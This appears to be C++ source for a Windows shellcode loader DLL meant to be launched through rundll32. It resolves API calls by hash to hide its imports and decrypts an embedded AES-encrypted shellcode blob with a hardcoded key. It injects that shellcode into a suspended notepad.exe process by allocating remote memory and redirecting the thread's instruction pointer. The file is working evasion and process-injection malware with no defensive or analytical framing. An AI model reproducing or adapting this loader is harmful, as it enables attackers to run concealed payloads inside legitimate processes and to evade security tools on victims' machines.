#include <windows.h>
#include <iostream>
#include <vector>
#include <wincrypt.h>  // For AES functions (if needed)

#include "Headers/aes.h"
#include<iomanip>
#define RESOLVE_API(mod, name, type) (type)get_api_by_hash(GetModuleHandleA(mod), djb2_hash(name))
DWORD WINAPI Run(LPVOID lpParam);

extern "C" __declspec(dllexport) void RunPayload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    // Start your payload in a new thread so rundll32 doesn't hang
    HANDLE hThread=CreateThread(NULL, 0, Run, NULL, 0, NULL);
        if (hThread)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}




void print_hex(const std::vector<uint8_t>& data, const std::string& label = "") {
    if (!label.empty()) {
        std::cout << label << ": ";
    }
    std::cout << std::hex << std::setfill('0');
    for (uint8_t b : data) {
        std::cout << std::setw(2) << static_cast<int>(b);
    }
    std::cout << std::dec << std::endl; // Reset to decimal for general output
}


DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}


FARPROC get_api_by_hash(HMODULE hModule, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hModule + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + rva);

    DWORD *names = (DWORD *)((BYTE *)hModule + exp->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)hModule + exp->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)hModule + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *func_name = (char *)((BYTE *)hModule + names[i]);
        if (djb2_hash(func_name) == target_hash) {
            return (FARPROC)((BYTE *)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}



  

//  DWORD hash = djb2_hash("VirtualAlloc");
// FARPROC va = get_api_by_hash(GetModuleHandleA("kernel32.dll"), hash);
// LPVOID mem=((LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))va)(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


// if (mem == NULL) {
 
//     return 1;
// }


// print_hex(decrypted);

// memcpy(mem,decrypted.data(),decrypted.size());



// DWORD hash_2 = djb2_hash("CreateThread");
// FARPROC ct = get_api_by_hash(GetModuleHandleA("kernel32.dll"), hash_2);
// HANDLE hThread = ((HANDLE(WINAPI*)(
//     LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))ct)(
//         NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);





std::vector<uint8_t> remove_pkcs7_padding(const std::vector<uint8_t>& padded_data) {
    if (padded_data.empty()) {
        return {};
    }

    uint8_t padding_value = padded_data.back();
    if (padding_value == 0 || padding_value > padded_data.size()) {
        // Invalid padding value or padding length exceeds data size
        throw std::runtime_error("Invalid PKCS#7 padding.");
    }

    // Check if all padding bytes have the correct value
    for (size_t i = 0; i < padding_value; ++i) {
        if (padded_data[padded_data.size() - 1 - i] != padding_value) {
            throw std::runtime_error("Invalid PKCS#7 padding (byte mismatch).");
        }
    }

    // Return a new vector without the padding
    return std::vector<uint8_t>(padded_data.begin(), padded_data.end() - padding_value);
}






DWORD WINAPI Run(LPVOID lpParam) {
    MessageBox(NULL, "Payload is running!", "Info", MB_OK);
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";

    // 1. Create target process in suspended state
    if (!CreateProcessA(
        targetProcess,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        std::cerr << "[!] Failed to start target process. Error: " << GetLastError() << "\n";
        return 1;
    }


    // Assume pi is PROCESS_INFORMATION and recovered_shellcode_bytes is a std::vector<uint8_t>

auto pVAEX = RESOLVE_API("kernel32.dll", "VirtualAllocEx", LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD));
auto pWPM = RESOLVE_API("kernel32.dll", "WriteProcessMemory", BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*));
auto pVPEX = RESOLVE_API("kernel32.dll", "VirtualProtectEx", BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD));
auto pGTC = RESOLVE_API("kernel32.dll", "GetThreadContext", BOOL(WINAPI*)(HANDLE, LPCONTEXT));
auto pSTC = RESOLVE_API("kernel32.dll", "SetThreadContext", BOOL(WINAPI*)(HANDLE, const CONTEXT*));
auto pRT = RESOLVE_API("kernel32.dll", "ResumeThread", DWORD(WINAPI*)(HANDLE));
auto pTP = RESOLVE_API("kernel32.dll", "TerminateProcess", BOOL(WINAPI*)(HANDLE, UINT));



    uint8_t key[] = {
        0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    }; // AES128 key (16 bytes)

    // Hardcoded Initialization Vector (IV) (MUST match the IV used for encryption)
    uint8_t iv[] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0A
    };

    // Replace this with YOUR ENCRYPTED SHELLCODE from the previous run.
    // This is an example placeholder. Make sure it matches the padded length from encryption.
    // Example: If your original shellcode was 65 bytes, and it was padded to 80 bytes for encryption,
    // this encrypted_shellcode_data should be 80 bytes long.
     std::vector<uint8_t> ciphertext_bytes= {
0x64, 0x35, 0x66, 0xc1, 0x74, 0xf4, 0x48, 0x33, 0x00, 0x9d, 0x9b, 0x6f, 0x78, 0x75, 0xb9, 0x37, 
    0x5c, 0x0d, 0x3f, 0x15, 0x52, 0xdc, 0xce, 0x5d, 0x64, 0xcb, 0xa5, 0x50, 0xb2, 0xc5, 0x3c, 0x3f, 
    0x20, 0xd0, 0x2e, 0xaf, 0x82, 0xf0, 0xaf, 0x4e, 0x6c, 0x96, 0x17, 0x91, 0x84, 0x76, 0x42, 0xc3, 
    0x06, 0xc3, 0xe3, 0x1d, 0xf4, 0x67, 0xd2, 0x7c, 0x7e, 0x3b, 0x95, 0xdd, 0x65, 0xdc, 0xc6, 0xa9, 
    0xaf, 0x5b, 0xf9, 0xab, 0x8c, 0x69, 0x7a, 0xad, 0xe4, 0x1f, 0xf8, 0x7d, 0xc2, 0x61, 0xda, 0xe8, 
    0xf9, 0xb6, 0xca, 0x87, 0x06, 0x59, 0x21, 0x1d, 0xac, 0xf6, 0x01, 0x10, 0xb8, 0x40, 0xf4, 0x52, 
    0xfc, 0x5b, 0xf0, 0x22, 0x08, 0xaf, 0x8f, 0x2c, 0x0a, 0x33, 0x30, 0xfc, 0x9b, 0xa7, 0x28, 0x2d, 
    0xba, 0x34, 0x02, 0x8e, 0x5f, 0xe2, 0x52, 0xc1, 0xdb, 0x16, 0x1a, 0x2c, 0x59, 0xc2, 0x50, 0x15, 
    0xec, 0xd5, 0x35, 0x87, 0xc6, 0xec, 0x13, 0x84, 0x08, 0xbf, 0x84, 0x9e, 0x67, 0x6b, 0x93, 0x48, 
    0x72, 0x6b, 0x65, 0x60, 0xe1, 0x19, 0xf1, 0x72, 0xbc, 0x86, 0xd5, 0x9a, 0xdb, 0x0b, 0x69, 0x1a, 
    0x0c, 0x81, 0x2a, 0x34, 0x84, 0xff, 0x23, 0x48, 0x6f, 0x15, 0x35, 0x5a, 0x63, 0xf9, 0x56, 0x6a, 
    0xed, 0x98, 0x99, 0xe5, 0x9f, 0xfa, 0x56, 0xfe, 0xa8, 0xe7, 0xb2, 0x92, 0x4e, 0xc9, 0x80, 0x0a, 
    0x94, 0xd4, 0xda, 0x2e, 0xc0, 0xac, 0xaf, 0x26, 0x40, 0x05, 0xb9, 0x2d, 0xa1, 0xde, 0xfb, 0x52, 
    0xfb, 0xba, 0x8e, 0x5f, 0x58, 0x58, 0x7b, 0x11, 0x5e, 0x3c, 0x3a, 0xaf, 0xbc, 0x70, 0x20, 0x2c, 
    0xaf, 0x02, 0xc4, 0x4f, 0x1a, 0xbf, 0x2c, 0x5d, 0x76, 0xca, 0xfa, 0x16, 0x82, 0x2b, 0x07, 0x15, 
    0x5f, 0xcc, 0x63, 0x1f, 0x00, 0x1a, 0xfe, 0xc5, 0x6d, 0xbf, 0x5f, 0xbc, 0x65, 0x0d, 0x46, 0xdd, 
    0x88, 0x14, 0xcc, 0xd7, 0x53, 0xdf, 0x5f, 0x44, 0x4d, 0x39, 0x7f, 0x29, 0xfc, 0x54, 0xb4, 0x52, 
    0x7b, 0x5a, 0x94, 0xaf, 0x73, 0xf1, 0x4e, 0xab, 0xbc, 0x5e, 0x7d, 0xc8, 0xd3, 0xe6, 0x66, 0x4e, 
    0x44, 0x9d, 0x1b, 0x53, 0x67, 0x06, 0x32, 0x03, 0x14, 0xa2, 0x1c, 0x89, 0x2b, 0xd5, 0x91, 0xe7, 
    0x50, 0x3a, 0x5a, 0xa2, 0xc0, 0x08, 0x79, 0xcc, 0x5d, 0x70, 0x82, 0x66, 0x28, 0xe1, 0x05, 0x18, 
    0x91, 0x82, 0xd2, 0xe6, 0xb6, 0xc5, 0x4e, 0xa2, 0xee, 0x22, 0x3b, 0xb5, 0x10, 0x99, 0x7b, 0x78, 
    0x50, 0xb8, 0x5f, 0x38, 0xcf, 0xa6, 0xac, 0x70, 0x71, 0x40, 0xf5, 0xb3, 0x5e, 0x0b, 0x3a, 0x02, 
    0xa1, 0xaf, 0x1d, 0xa1, 0xb7, 0x87, 0xf3, 0x02, 0x5a, 0xb2, 0xcd, 0x3d, 0xcd, 0xe4, 0xec, 0x05, 
    0x52, 0x48, 0xe3, 0x7c, 0x7d, 0x95, 0xbe, 0x74, 0xd7, 0x5d, 0x1e, 0xc9, 0xfd, 0x03, 0xcc, 0x8c, 
    0xd3, 0x54, 0xb5, 0x62, 0x50, 0xbc, 0x69, 0x46, 0xf9, 0x98, 0x1c, 0x59, 0xbf, 0xd2, 0x2c, 0x76, 
    0x7f, 0x44, 0xaa, 0x21, 0xad, 0xba, 0x4f, 0xea, 0x7d, 0x5f, 0x51, 0x30, 0x23, 0xde, 0x3f, 0x48, 
    0xd5, 0x40, 0x29, 0x7e, 0x89, 0x5f, 0x7f, 0x3c, 0x06, 0xf4, 0x7b, 0x9a, 0xc4, 0x5b, 0x29, 0x75, 
    0xf6, 0x50, 0x2b, 0xa6, 0x04, 0xe1, 0xe5, 0xe4, 0x4d, 0xb5, 0x69, 0x37, 0x01, 0x88, 0x83, 0x38, 
    0x85, 0x4f, 0x8d, 0xfe, 0x3b, 0xbd, 0x86, 0x6a, 0x74, 0xeb, 0xc8, 0x70, 0xfa, 0xd9, 0x36, 0x38
    };




    // Prepare buffer for decrypted bytes
    std::vector<uint8_t> decrypted_bytes(ciphertext_bytes.size());
    std::vector<uint8_t> recovered_shellcode_bytes;

    // Context for AES operation
    struct AES_ctx ctx;

    // --- Decryption ---
    try {
        // Initialize AES context with the key
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer for decryption
        uint8_t current_iv_decrypt[AES_BLOCKLEN];
        memcpy(current_iv_decrypt, iv, AES_BLOCKLEN);

        // Set the IV for decryption
        AES_ctx_set_iv(&ctx, current_iv_decrypt);

        // Decrypt the ciphertext buffer
        // Note: AES_CBC_decrypt_buffer modifies the input buffer in-place
        std::vector<uint8_t> decrypt_temp_buffer = ciphertext_bytes; // Work on a copy
        AES_CBC_decrypt_buffer(&ctx, decrypt_temp_buffer.data(), decrypt_temp_buffer.size());

        print_hex(decrypt_temp_buffer);

        

        // Copy decrypted data
        std::copy(decrypt_temp_buffer.begin(), decrypt_temp_buffer.end(), decrypted_bytes.begin());

        print_hex(decrypted_bytes, "\nDecrypted (padded) hex");








        // Remove PKCS#7 padding from the decrypted data
        recovered_shellcode_bytes = remove_pkcs7_padding(decrypted_bytes);
        std::cout << "Recovered Shellcode Length (unpadded): " << recovered_shellcode_bytes.size() << " bytes" << std::endl;
        print_hex(recovered_shellcode_bytes, "Recovered Shellcode (hex)");
         // Ground(recovered_shellcode_bytes);











LPVOID remoteMem = pVAEX(pi.hProcess, NULL, recovered_shellcode_bytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (!remoteMem) {
    std::cerr << "[!] VirtualAllocEx failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}

if (!pWPM(pi.hProcess, remoteMem, recovered_shellcode_bytes.data(), recovered_shellcode_bytes.size(), NULL)) {
    std::cerr << "[!] WriteProcessMemory failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}

DWORD oldProtect;
if (!pVPEX(pi.hProcess, remoteMem, recovered_shellcode_bytes.size(), PAGE_EXECUTE_READ, &oldProtect)) {
    std::cerr << "[!] VirtualProtectEx failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;

if (!pGTC(pi.hThread, &ctx)) {
    std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}

#ifdef _WIN64
ctx.Rip = (DWORD64)remoteMem;
#else
ctx.Eip = (DWORD)remoteMem;
#endif

if (!pSTC(pi.hThread, &ctx)) {
    std::cerr << "[!] SetThreadContext failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}
 MessageBox(NULL, "Payload is running!", "Info", MB_OK);
if (pRT(pi.hThread) == (DWORD)-1) {
    std::cerr << "[!] ResumeThread failed. Error: " << GetLastError() << "\n";
    pTP(pi.hProcess, 0);
    return 1;
}



CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);


    //------------------------------------------------------------------------------------------------------------------------------------




    // 2. Decrypt shellcode
  }
catch (const std::exception& e) {
    std::cerr << "Exception caught: " << e.what() << std::endl;
}

  return 0;
}


   
